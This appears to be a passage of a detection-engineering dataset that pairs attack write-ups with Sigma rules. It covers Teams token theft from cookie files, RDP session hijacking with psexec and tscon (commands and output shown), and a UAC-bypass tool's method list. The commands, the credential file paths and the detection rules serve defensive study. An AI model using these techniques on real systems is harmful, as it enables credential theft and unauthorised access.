token against the Microsoft jwt validation service, https://jwt.ms. Each token we found was active and worked without requiring additional authentication. The realization began to dawn that the initial problem of having to re-install teams was a much smaller issue than the identity abuse opportunity potentially looming in the Microsoft Teams client.\n\n## Let’s Do Something\n\nThe team set to work with this knowledge and began to craft tooling that took advantage of these unprotected credentials. After considering multiple options, it was determined that sending a message to the account of the credential holder through Teams with an access token would be appropriate. With this goal in mind, we launched the Teams client in the browser to track API calls when sending messages and found this gem:\n\n`https://amer.ng.msg.teams.microsoft.com/v1/users/ME/conversations/48:notes/messages`\n\nThis API endpoint lets us send messages to ourselves, and we do not have to futz around with account enumeration. Next, we needed the access token. We used the SQLite engine. SQLite does not require installation, so the tooling downloads SQLite to a local folder and executes it to read the Cookies DB, where we extract the Skype Access token required for sending messages.\n\nWith the token in hand and our destination in mind, the last piece was to string together a message. The request body took some time to get working, but we eventually succeeded. We set the message to send with the high importance flag set, and the subject of “You’ve Been PWND.” The message itself is the Skype Access Token.\n\n```image\nAlt: Undermining 6\nDescription: The image displays a code snippet related to sending a message through Microsoft Teams using an access token. It includes key-value pairs such as 'content', 'messageType', 'importance', and 'subject', showing how the message is structured for high importance and is labeled as 'You've Been PWND'. This snippet is relevant to the context of extracting and utilizing credentials.\nTranscription: |\n  {\n    content = \"<p>$Token</p>\"\n    messagetype = \"RichText/Html\"\n    contenttype = \"text\"\n    amsreferences = @()\n    clientmessageid = $id\n    imdisplayname = \"Threat Bot\"\n    properties = @{\n      importance = \"high\"\n      subject = \"You've Been PWND\"\n    }\n  }\n```\n\nThe tool sends the message at this point, and we can validate that the access token is in our personal chat.\n\n```image\nAlt: Undermining 4\nDescription: The image displays a chat message in a messaging application (likely Microsoft Teams), which contains a highlighted text labeled \"IMPORTANT!!\" followed by a string of text that appears to be a Skype access token. The message indicates the significance of the token, suggesting it is meant to be noticed and potentially used for malicious purposes.\nTranscription: |\n  8/8 2:26 PM\n  IMPORTANT!!\n  skypetoken=eyJhbGciOiJSUzI1NiIsImtpZCI6IjC6Im9QMWFxQnlfr3hZUpSaXhuQ25zdESP\n  IJ2z2dksB5cGklpXCI9eXOiOiF2NT5N5iN4i9mV4cIGMTY2MDA1NDI2M2wi2t5GvZ7GIl\n```\n\nNot too shabby for a morning’s work.\n\n## The Implications of Unsecured Credentials\n\nMicrosoft stores these credentials to create a seamless single sign-on experience within the desktop application. However, the implementation of these security choices lowers the bar.\n\nAnyone who installs and uses the Microsoft Teams client in this state is storing the credentials needed to perform any action possible through the Teams UI, even when Teams is shut down. When these tokens are stolen, it enables attackers to modify SharePoint files, Outlook mail and calendars, and Teams chat files. Attackers can tamper with legitimate communications within an organization by selectively destroying, exfiltrating, or engaging in targeted phishing attacks.\n\n## The Big Scary – The Ultimate Phish\n\nHere the thing that truly frightens us is the proliferation of post-MFA user tokens across an environment – it enables subsequent attacks that do not require additional special permissions or advanced malware to get away with major internal damage. With enough compromised machines, attackers can orchestrate communications within an organization. Assuming full control of critical seats–like a company’s Head of Engineering, CEO, or CFO—attackers can convince users to perform tasks damaging to the organization. How do you practice phish testing for this?\n\n## Recommendations\n\n### To Administrators\n\n#### Baseline Teams, Manage Configurations, and Monitor ACL Changes\n\nTreat teams as a critical application and baseline and enforce the ACLs that protect it. Modification of these ACLs to extend read file access outside of the intended user will effectively expose that user’s credentials to any of the malicious actions emphasized above.\n\nOnce Microsoft has updated the Electron Teams applications, it is still critical to move to a high-restriction model for preventing the installation of unauthorized Teams Apps, bots, connectors, etc.\n\n#### Track File Access\n\nCreate a system monitoring rule to identify the processes accessing these sensitive files. There are two specific file/folder recommendations:\n\n- [Windows] `%AppData%\\Microsoft\\Teams\\Cookies`\n- [Windows] `%AppData%\\Microsoft\\Teams\\Local Storage\\leveldb`\n- [macOS] `~/Library/Application Support/Microsoft/Teams/Cookies`\n- [macOS] `~/Library/Application Support/Microsoft/Teams/Local Storage/leveldb`\n- [Linux] `~/.config/Microsoft/Microsoft Teams/Cookies`\n- [Linux] `~/.config/Microsoft/Microsoft Teams/Local Storage/leveldb`\n\nIf any process other than Teams.exe accesses these files, it indicates that the stored data is being accessed outside the context of the Teams application.\n\n```image\nAlt: Undermining 5\nDescription: The image depicts a security event log detailing an attempt to access a file related to Microsoft Teams. It includes specific identifiers such as the Security ID, Account Name, Account Domain, and Logon ID associated with the user account. The Object section lists the details of the targeted file, including the Object Server, Object Type, and the Object Name, which specifies the path to the Cookies file within the Teams application. Additionally, the Process Information section provides the Process ID and Process Name, indicating that this access attempt was made by the Teams executable itself.\nTranscription: |\n  An attempt was made to access an object.\n  Subject:\n      Security ID: VECTRA\\cpeoples\n      Account Name: cpeoples\n      Account Domain: VECTRA\n      Logon ID: 0x40B600\n  \n  Object:\n      Object Server: Security\n      Object Type: File\n      Object Name: C:\\Users\\cpeoples\\AppData\\Roaming\\Microsoft\\Teams\\Cookies\n      Handle ID: 0x48c\n      Resource Attributes: S:AI\n  \n  Process Information:\n      Process ID: 0x4380\n      Process Name: C:\\Users\\cpeoples\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\n```\n\n#### Consider the Web App as an Alternative\n\nIf baselining and monitoring is impractical, consider using the web-based Teams client inside Microsoft Edge, which has multiple OS-level controls to protect token leaks. Fortunately, the Teams web application is robust and supports most features enabled through the desktop client, keeping organization productivity impacts to a minimum.\n\nFor Linux users, this is the recommended path full stop as Microsoft has announced the end of life for Teams for Linux by December 2022.\n\n### To Developers\n\nIf you must use Electron for your application, ensure you securely store OAuth tokens. One such method for storing secrets is to use the package KeyTar, which leverages local OS security mechanisms for secret management.\n\nHow to securely store sensitive information in Electron with node-keytar | by Cameron Nokes | Medium\n\n### To Microsoft\n\nIf you must store the tokens, do so in an encrypted fashion and raise the bar from a simple read access on the file system to requiring some ongoing access to memory. And please let us remove disabled accounts from the Teams app(s) without having to do a full uninstall/re-install.\n\n### To Security Teams\n\nTo stop an attacker that would leverage this type of exploit, teams should invest in threat detection, and response solutions that can see the kinds of actions before and after the exploit are leveraged. Vectra’s threat detection and response platform would detect command and control tactics that would be expected before this exploit and any network reconnaissance, lateral movement, or exfiltration that would occur after the exploit. In the cloud, Vectra would alert on the attacker’s activities using the compromised credentials in Azure AD, including privileged in Azure AD, full-scale attacks against connected cloud service providers like AWS, and attacks against other Microsoft 365 applications, including Exchange, SharePoint, and Power Automate.\n\n#### Threat Detection and Response for your Azure AD\n\nTo learn more about how Vectra can see and stop threats please visit:\nhttps://www.vectra.ai/attack-surface/azure-ad",
    "sigma_rule": {
      "title": "Potentially Suspicious Command Targeting Teams Sensitive Files",
      "id": "d2eb17db-1d39-41dc-b57f-301f6512fa75",
      "status": "test",
      "description": "Detects a commandline containing references to the Microsoft Teams database or cookies files from a process other than Teams.\nThe database might contain authentication tokens and other sensitive information about the logged in accounts.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
        "https://web.archive.org/web/20230726144455/https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens"
      ],
      "author": "@SerkinValery",
      "date": "2022-09-16",
      "modified": "2023-12-18",
      "tags": [
        "attack.credential-access",
        "attack.t1528"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "\\Microsoft\\Teams\\Cookies",
            "\\Microsoft\\Teams\\Local Storage\\leveldb"
          ]
        },
        "filter_main_legit_locations": {
          "Image|endswith": "\\Microsoft\\Teams\\current\\Teams.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_teams_suspicious_command_line_cred_access.yml",
    "id": "605"
  },
  {
    "url": "https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement",
    "markdown": "# RDP Hijacking for Lateral Movement with tscon\n\nThis lab explores a technique that allows a SYSTEM account to move laterally through the network using RDP without the need for credentials.\n\n## Execution\n\nIt is possible by design to switch from one user's desktop session to another through the Task Manager (one of the ways).\n\nBelow shows that there are two users on the system and currently the administrator session is in active:\n\n```image\nAlt: RDP Admin Session\nDescription: The image displays a Windows Task Manager interface showing two user sessions: \"administrator\" and \"spotless.\" The administrator session is active, while the spotless session is disconnected. The Task Manager window includes details about CPU and memory usage for each session. Below the Task Manager, there is a Command Prompt window displaying the output of the command 'whoami,' indicating the current user is 'administrator.' This image illustrates the context of RDP hijacking and user session management in a technical scenario.\nTranscription: |\n  Task Manager\n  \n  Users\n  \n  User                 Status                 CPU      Memory\n  administrator (10)   0%       130.3 MB\n  spotless (10)        Disconnected           0%       76.6 MB\n  \n  Administrator: Command Prompt\n  \n  Microsoft Windows [Version 6.3.9600]\n  (c) 2013 Microsoft Corporation. All rights reserved.\n  \n  C:\\Users\\Administrator>whoami\n  offense\\administrator\n  \n  C:\\Users\\Administrator>\n```\n\nLet's switch to the `spotless` session - this requires knowing the user's password, which for this exercise is known, so let's enter it:\n\n```image\nAlt: RDP Login\nDescription: The image depicts a screenshot of the Windows Task Manager, focused on the 'Users' tab. It shows two user sessions: 'administrator' and 'spotless'. The 'administrator' session is active and consuming more memory, while the 'spotless' session is disconnected. There is also a contextual menu visible, indicating options for the selected user session, including 'Connect', 'Sign off', 'Send message', 'Switch user account', and 'Manage user accounts'. This image is relevant as it illustrates the ability to connect to another user's session in the context of RDP hijacking.\nTranscription: |\n  Processes  Performance  Users  Details  Services\n  \n  User                  Status          3% CPU    28% Memory\n  administrator (10)                   0%        123.2 MB\n  spotless (10)        Disconnected    0%         76.4 MB\n  \n  Options:\n  - Expand\n  - Connect\n  - Sign off\n  - Send message\n  - Switch user account\n  - Manage user accounts\n```\n\n```image\nAlt: RDP Login\nDescription: The image depicts a Task Manager window on a Windows operating system, displaying two user sessions: 'administrator' and 'spotless'. The 'spotless' session is highlighted, requiring a password for access. The window shows CPU and memory usage statistics for both sessions. This image is relevant to the context of RDP hijacking, illustrating the process of accessing a user's session by entering their password.\n```\n\nWe are now reconnected to the `spotless` session:\n\n```image\nAlt: Spotless Session\nDescription: The image shows a screenshot of the Task Manager on a Windows system, displaying two user sessions: one for 'administrator' (which is disconnected) and another for 'spotless' (which is active). The Task Manager indicates CPU and memory usage for both sessions. Additionally, there is a Command Prompt window showing the output of the command 'whoami', confirming the active user as 'spotless'. This image is relevant to the context of Remote Desktop Protocol (RDP) hijacking techniques.\nTranscription: |\n  Task Manager\n  \n  Users\n  \n  User              Status          CPU     Memory\n  administrator (10) Disconnected   0%      114.0 MB\n  spotless (10)                    0.3%     131.6 MB\n  \n  Command Prompt\n  \n  Microsoft Windows [Version 6.3.9600]\n  (c) 2013 Microsoft Corporation. All rights reserved.\n  \n  C:\\Users\\spotless>whoami\n  offense\\spotless\n  \n  C:\\Users\\spotless>_\n```\n\nNow this is where it gets interesting. It is possible to reconnect to a user's session without knowing their password if you have `SYSTEM` level privileges on the system. Let's elevate to `SYSTEM` using psexec (privilege escalation exploits, service creation, or any other technique will also do):\n\n```\npsexec -s cmd\n```\n\n```image\nAlt: RDP SYSTEM\nDescription: The image displays a Windows PowerShell terminal showing the execution of the PsExec tool, which is part of the Sysinternals suite. The terminal indicates that the user navigates to a directory (`C:\\tools\\PSTools`) and executes `PsExec.exe` with the `-s` flag, which runs the command prompt (`cmd`) with system-level privileges. The output also confirms the current user context as 'SYSTEM', as indicated by the command `whoami`. This image is relevant to the context of RDP hijacking and privilege escalation.\nTranscription: |\n  Windows PowerShell\n  Copyright (C) 2014 Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Users\\Administrator> cd C:\\tools\\PSTools\n  PS C:\\tools\\PSTools> .\\PsExec.exe -s cmd\n  \n  PsExec v2.2 - Execute processes remotely\n  Copyright (C) 2001-2016 Mark Russinovich\n  Sysinternals - www.sysinternals.com\n  \n  \n  Microsoft Windows [Version 6.3.9600]\n  (c) 2013 Microsoft Corporation. All rights reserved.\n  \n  C:\\Windows\\system32>whoami\n  nt authority\\system\n```\n\nEnumerate available sessions on the host with `query user`:\n\n```image\nAlt: RDP Sessions\nDescription: The image displays a command line output from a Windows system, showing the results of the `query user` command. It lists two user sessions: 'administrator' (active) and 'spotless' (disconnected). The output includes details such as the username, session name, session ID, state (active or disconnected), idle time, and logon time for each session.\nTranscription: |\n  plaintext\n  C:\\Windows\\system32>query user\n  USERNAME       SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n  administrator  console             1  Active  8          8/12/2018 11:51 AM\n  spotless                           2  Disc    8          8/12/2018 12:02 PM\n  \n  C:\\Windows\\system32>\n```\n\nSwitch to the `spotless` session without getting requested for a password by using the native Windows binary `tscon.exe` that enables users to connect to other desktop sessions by specifying which session ID (`2` in this case for the `spotless` session) should be connected to which session (`console` in this case, where the active `administrator` session originates from):\n\n```\ncmd /k tscon 2 /dest:console\n```\n\n```image\nAlt: RDP Hijack No Password\nDescription: The image displays a command line interface (CLI) from a Windows PowerShell session. It shows the execution of the command 'cmd /k tscon 2 /dest:console', which is used to switch user sessions in a Remote Desktop Protocol (RDP) context. The screen includes various outputs: the current user is 'Administrator', with an active session ID, and a second user 'spotless' is listed with its session ID. It also shows the version of Windows and the usage of 'PsExec', a tool for executing processes remotely.\nTranscription: |\n  Windows PowerShell\n  Copyright (C) 2014 Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Users\\Administrator> cd C:\\tools\\PSTools\n  PS C:\\tools\\PSTools> .\\PsExec.exe -s cmd\n  \n  PsExec v2.2 - Execute processes remotely\n  Copyright (C) 2001-2016 Mark Russinovich\n  Sysinternals - www.sysinternals.com\n  \n  Microsoft Windows [Version 6.3.9600]\n  (c) 2013 Microsoft Corporation. All rights reserved.\n  \n  C:\\Windows\\system32>whoami\n  nt authority\\system\n  \n  C:\\Windows\\system32>query\n  Invalid parameter(s)\n  QUERY { PROCESS | SESSION | TERMSERVER | USER }\n  \n  C:\\Windows\\system32>query user\n  USERNAME        SESSIONNAME    ID  STATE   IDLE TIME  LOGON TIME\n  administrator   console        1   Active  8  8/12/2018 11:51 AM\n  spotless                       2   Disc    8  8/12/2018 12:02 PM\n  \n  C:\\Windows\\system32>cmd /k tscon 2 /dest:console\n  \n  C:\\Windows\\system32>\n```\n\nImmediately after that, we are presented with the desktop session for `spotless`:\n\n```image\nAlt: Spotless with SYSTEM\nDescription: The image shows a Windows Task Manager window displaying two user sessions: an administrator session that is currently disconnected and a 'spotless' user session. Below the Task Manager, there is a Command Prompt window showing the output of the 'whoami' command, confirming that the user is currently logged in as 'spotless'. The Task Manager highlights CPU and memory usage for the sessions, providing a visual representation of the system's resource allocation.\nTranscription: |\n  Task Manager\n  \n  Users\n  \n  User               Status               CPU   Memory\n  administrator (15) Disconnected         0%    204.7 MB\n  Console Window Host                    0%    1.6 MB\n  Console Window Host                    0%    1.5 MB\n  \n  Command Prompt\n  \n  Microsoft Windows [Version 6.3.9600]\n  (c) 2013 Microsoft Corporation. All rights reserved.\n  \n  C:\\Users\\spotless>whoami\n  offense\\spotless\n  \n  C:\\Users\\spotless>_\n```\n\n## Observations\n\nLooking at the logs, `tscon.exe` being executed as a `SYSTEM` user is something you may want to investigate further to make sure this is not a lateral movement attempt:\n\n```image\nAlt: RDP Logs\nDescription: The image depicts a table of RDP logon and logoff events, displaying various columns including 'Time', 'task', 'event_data.LogonType', 'event_data.CommandLine', 'user.name', 'event_id', 'process_id', 'event_data.TargetLogonId', 'event_data.SessionName', 'event_data.SubjectLogonId', and 'event_data.LogonID'. The table contains multiple entries, with specific details about the execution of 'tscon' and 'cmd' commands, highlighting the SYSTEM user and relevant event IDs related to logon sessions.\nTranscription: |\n  | Time                           | task                              | event_data.LogonType | event_data.CommandLine          | user.name | event_id | process_id | event_data.TargetLogonId | event_data.SessionName | event_data.SubjectLogonId | event_data.LogonID |\n  |--------------------------------|-----------------------------------|----------------------|---------------------------------|-----------|----------|------------|--------------------------|------------------------|---------------------------|---------------------|\n  | August 12th 2018, 12:37:49.952 | Other Logon/Logoff Events         | -                    | -                               | -         | 4,778    | 572        | -                        | Console                | -                         | 0x3ccc              |\n  | August 12th 2018, 12:37:49.883 | Process Create (rule: ProcessCreate) | -                    | tscon 2 /dest:console           | SYSTEM    | 1        | 1,872      | -                        | -                      | -                         | -                   |\n  | August 12th 2018, 12:37:49.869 | Other Logon/Logoff Events         | -                    | -                               | -         | 4,779    | 572        | -                        | Console                | -                         | 0x3dec              |\n  | August 12th 2018, 12:37:49.861 | Process Create (rule: ProcessCreate) | -                    | cmd /k tscon 2 /dest:console    | SYSTEM    | 1        | 1,872      | -                        | -                      | -                         | -                   |\n```\n\nAlso, note how `event_data.LogonID` and event_ids `4778` (logon) and `4779` (logoff) events can be used to figure out which desktop sessions got disconnected/reconnected:\n\n```image\nAlt: RDP Session Disconnect\nDescription: The image displays a detailed log entry related to an event with ID 4779, indicating a session disconnection from a Windows Station. Key details include the account name 'administrator', account domain 'OFFENSE', and a specific logon ID. Additional information about the session name, client name, and client address is provided, along with a message explaining that this event occurs when a user disconnects from a Terminal Services session or switches desktops.\nTranscription: |\n  # event_id\n  🔍 📑 ⛭ ✶ 4,779\n  \n  t host.name\n  🔍 📑 ⛭ ✶ dcc-mantvydas\n  \n  t keywords\n  🔍 📑 ⛭ ✶ Audit Success\n  \n  t level\n  🔍 📑 ⛭ ✶ Information\n  \n  t log_name\n  🔍 📑 ⛭ ✶ Security\n  \n  t message\n  🔍 📑 ⛭ ✶ A session was disconnected from a Window Station.\n  \n      Subject:\n          Account Name:        administrator\n          Account Domain:      OFFENSE\n          Logon ID:            0x2D3EC\n  \n      Session:\n          Session Name:        Console\n  \n      Additional Information:\n          Client Name:         Unknown\n          Client Address:      LOCAL\n  \n      This event is generated when a user disconnects from an existing Terminal Services session, or when a user switches away from an existing desktop using Fast User Switching.\n```\n\n```image\nAlt: Spotless Session Reconnect\nDescription: The image displays a log entry related to event ID 4778, indicating that a user session was reconnected to a Windows station. The log includes details such as the account name ('spotless'), account domain ('OFFENSE'), logon ID ('0x63CCCC'), session name ('Console'), client name ('Unknown'), and client address ('LOCAL'). Additionally, it provides an explanation that this event is generated when a user reconnects to an existing Terminal Services session or switches to an existing desktop.\nTranscription: |\n  # event_id\n  🔍 📑 ✱ 4,778\n  \n  t host.name\n  🔍 📑 ✱ dc-mantvydas\n  \n  t keywords\n  🔍 📑 ✱ Audit Success\n  \n  t level\n  🔍 📑 ✱ Information\n  \n  t log_name\n  🔍 📑 ✱ Security\n  \n  t message\n  🔍 📑 ✱ A session was reconnected to a Window Station.\n  \n      Subject:\n          Account Name:        spotless\n          Account Domain:      OFFENSE\n          Logon ID:            0x63CCC\n  \n      Session:\n          Session Name:        Console\n  \n      Additional Information:\n          Client Name:         Unknown\n          Client Address:      LOCAL\n  \n      This event is generated when a user reconnects to an existing Terminal Services session, or when a user switches to an existing desktop using Fast User Switching.\n```\n\nJust reinforcing the above - note the usernames and logon session IDs:\n\n```image\nAlt: RDP Logon Sessions\nDescription: The image displays the properties window of two instances of the 'explorer.exe' process, showing information related to RDP logon sessions. The upper section indicates the properties for the user 'OFFENSE\\administrator' with a logon session ID of '2d3ec', while the lower section shows 'OFFENSE\\spotless' with a logon session ID of '63ccc'. Each section includes details like the session number and user, which are critical for analyzing RDP hijacking and lateral movement scenarios.\nTranscription: |\n  explorer.exe:1712 Properties\n  \n  User: OFFENSE\\administrator\n  SID: S-1-5-21-4174252648-1021989953-2368502130-500\n  Session: 1       Logon Session: 2d3ec\n  \n  explorer.exe:536 Properties\n  \n  User: OFFENSE\\spotless\n  SID: S-1-5-21-4174252648-1021989953-2368502130-1105\n  Session: 2       Logon Session: 63ccc\n  Virtualized: No  Protected: No\n```\n\n## References\n\n- Vol de session RDP - Blog de Gentil Kiwi\n- Passwordless RDP Session Hijacking Feature All Windows versions\n- Windows Security Log Event ID 4778 - A session was reconnected to a Window Station\n- tscon",
    "sigma_rule": {
      "title": "Suspicious TSCON Start as SYSTEM",
      "id": "9847f263-4a81-424f-970c-875dab15b79b",
      "status": "test",
      "description": "Detects a tscon.exe start as LOCAL SYSTEM",
      "references": [
        "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
        "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
        "https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-03-17",
      "modified": "2022-05-27",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "User|contains": [
            "AUTHORI",
            "AUTORI"
          ],
          "Image|endswith": "\\tscon.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tscon_localsystem.yml",
    "id": "608"
  },
  {
    "url": "https://github.com/hfiref0x/UACME",
    "markdown": "# UACMe\n\n## Folders and Files\n\n- Bin\n- Source\n- .gitattributes\n- LICENSE.md\n- README.md\n- appveyor.yml\n\n## README\n\nBuild status: build passing\n\n## UACMe\n\n### Defeating Windows User Account Control\n\n- Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor.\n\n### System Requirements\n\n- x86-32/x64 Windows 7/8/8.1/10/11 (client, some methods however works on server version too).\n- Admin account with UAC set on default settings required.\n\n### Usage\n\nRun executable from command line: `akagi32 [Key] [Param]` or `akagi64 [Key] [Param]`. See \"Run examples\" below for more info.\n\nFirst parameter is number of method to use, second is optional command (executable file name including full path) to run. Second parameter can be empty - in this case program will execute elevated `cmd.exe` from `system32` folder.\n\n**Note**: Since 3.5.0 version all \"fixed\" methods are considered obsolete and removed altogether with all supporting code/units. If you still need them - use v3.2.x branch.\n\n#### Keys (click to expand/collapse)\n\n1. **Author**: Leo Davidson\n   - **Type**: Dll Hijack\n   - **Method**: IFileOperation\n   - **Target(s)**: \\system32\\sysprep\\sysprep.exe\n   - **Component(s)**: cryptbase.dll\n   - **Implementation**: ucmStandardAutoElevation\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 8.1 (9600)\n     - **How**: sysprep.exe hardened LoadFrom manifest elements\n   - **Code status**: removed starting from v3.5.0 🚜\n\n2. **Author**: Leo Davidson derivative\n   - **Type**: Dll Hijack\n   - **Method**: IFileOperation\n   - **Target(s)**: \\system32\\sysprep\\sysprep.exe\n   - **Component(s)**: ShCore.dll\n   - **Implementation**: ucmStandardAutoElevation\n   - **Works from**: Windows 8.1 (9600)\n   - **Fixed in**: Windows 10 TP (> 9600)\n     - **How**: Side effect of ShCore.dll moving to \\KnownDlls\n   - **Code status**: removed starting from v3.5.0 🚜\n\n3. **Author**: Leo Davidson derivative by WinNT/Pitou\n   - **Type**: Dll Hijack\n   - **Method**: IFileOperation\n   - **Target(s)**: \\system32\\oobe\\setupsqm.exe\n   - **Component(s)**: WdsCore.dll\n   - **Implementation**: ucmStandardAutoElevation\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TH2 (10558)\n     - **How**: Side effect of OOBE redesign\n   - **Code status**: removed starting from v3.5.0 🚜\n\n4. **Author**: Jon Ericson, WinNT/Gootkit, mzH\n   - **Type**: AppCompat\n   - **Method**: RedirectEXE Shim\n   - **Target(s)**: \\system32\\cliconfg.exe\n   - **Component(s)**: -\n   - **Implementation**: ucmShimRedirectEXE\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TP (> 9600)\n     - **How**: Sdbinst.exe autoelevation removed, KB3045645/KB3048097 for rest Windows versions\n   - **Code status**: removed starting from v3.5.0 🚜\n\n5. **Author**: WinNT/Simda\n   - **Type**: Elevated COM interface\n   - **Method**: ISecurityEditor\n   - **Target(s)**: HKLM registry keys\n   - **Component(s)**: -\n   - **Implementation**: ucmSimdaTurnOffUac\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TH1 (10147)\n     - **How**: ISecurityEditor interface method changed\n   - **Code status**: removed starting from v3.5.0 🚜\n\n6. **Author**: Win32/Carberp\n   - **Type**: Dll Hijack\n   - **Method**: WUSA\n   - **Target(s)**: \\ehome\\mcx2prov.exe, \\system32\\migwiz\\migwiz.exe\n   - **Component(s)**: WdsCore.dll, CryptBase.dll, CryptSP.dll\n   - **Implementation**: ucmWusaMethod\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TH1 (10147)\n     - **How**: WUSA /extract option removed\n   - **Code status**: removed starting from v3.5.0 🚜\n\n7. **Author**: Win32/Carberp derivative\n   - **Type**: Dll Hijack\n   - **Method**: WUSA\n   - **Target(s)**: \\system32\\cliconfg.exe\n   - **Component(s)**: ntwdblib.dll\n   - **Implementation**: ucmWusaMethod\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TH1 (10147)\n     - **How**: WUSA /extract option removed\n   - **Code status**: removed starting from v3.5.0 🚜\n\n8. **Author**: Leo Davidson derivative by Win32/Tilon\n   - **Type**: Dll Hijack\n   - **Method**: IFileOperation\n   - **Target(s)**: \\system32\\sysprep\\sysprep.exe\n   - **Component(s)**: Actionqueue.dll\n   - **Implementation**: ucmStandardAutoElevation\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 8.1 (9600)\n     - **How**: sysprep.exe hardened LoadFrom manifest\n   - **Code status**: removed starting from v3.5.0 🚜\n\n9. **Author**: Leo Davidson, WinNT/Simda, Win32/Carberp derivative\n   - **Type**: Dll Hijack\n   - **Method**: IFileOperation, ISecurityEditor, WUSA\n   - **Target(s)**: IFEO registry keys, \\system32\\cliconfg.exe\n   - **Component(s)**: Attacker defined Application Verifier Dll\n   - **Implementation**: ucmAvrfMethod\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 10 TH1 (10147)\n     - **How**: WUSA /extract option removed, ISecurityEditor interface method changed\n   - **Code status**: removed starting from v3.5.0 🚜\n\n10. **Author**: WinNT/Pitou, Win32/Carberp derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation, WUSA\n    - **Target(s)**: \\system32\\{New}or{Existing}\\{autoelevated}.exe, e.g. winsat.exe\n    - **Component(s)**: Attacker defined dll, e.g. PowProf.dll, DevObj.dll\n    - **Implementation**: ucmWinSATMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 TH2 (10548)\n      - **How**: AppInfo elevated application path control hardening\n    - **Code status**: removed starting from v3.5.0 🚜\n\n11. **Author**: Jon Ericson, WinNT/Gootkit, mzH\n    - **Type**: AppCompat\n    - **Method**: Shim Memory Patch\n    - **Target(s)**: \\system32\\iscsicli.exe\n    - **Component(s)**: Attacker prepared shellcode\n    - **Implementation**: ucmShimPatch\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 8.1 (9600)\n      - **How**: Sdbinst.exe autoelevation removed, KB3045645/KB3048097 for rest Windows versions\n    - **Code status**: removed starting from v3.5.0 🚜\n\n12. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\sysprep\\sysprep.exe\n    - **Component(s)**: dbgcore.dll\n    - **Implementation**: ucmStandardAutoElevation\n    - **Works from**: Windows 10 TH1 (10240)\n    - **Fixed in**: Windows 10 TH2 (10565)\n      - **How**: sysprep.exe manifest updated\n    - **Code status**: removed starting from v3.5.0 🚜\n\n13. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\mmc.exe EventVwr.msc\n    - **Component(s)**: elsext.dll\n    - **Implementation**: ucmMMCMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS1 (14316)\n      - **How**: Missing dependency removed\n    - **Code status**: removed starting from v3.5.0 🚜\n\n14. **Author**: Leo Davidson, WinNT/Sirefef derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system\\credwiz.exe, \\system32\\wbem\\oobe.exe\n    - **Component(s)**: netutils.dll\n    - **Implementation**: ucmSirefefMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 TH2 (10548)\n      - **How**: AppInfo elevated application path control hardening\n    - **Code status**: removed starting from v3.5.0 🚜\n\n15. **Author**: Leo Davidson, Win32/Carberp derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\cliconfg.exe\n    - **Component(s)**: ntwdblib.dll\n    - **Implementation**: ucmGenericAutoelevation\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS1 (14316)\n      - **How**: Cliconfg.exe autoelevation removed\n    - **Code status**: removed starting from v3.5.0 🚜\n\n16. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\GWX\\GWXUXWorker.exe, \\system32\\inetsrv\\inetmgr.exe\n    - **Component(s)**: SLC.dll\n    - **Implementation**: ucmGWX\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS1 (14316)\n      - **How**: AppInfo elevated application path control and inetmgr executable hardening\n    - **Code status**: removed starting from v3.5.0 🚜\n\n17. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack (Import forwarding)\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\sysprep\\sysprep.exe\n    - **Component(s)**: unbcl.dll\n    - **Implementation**: 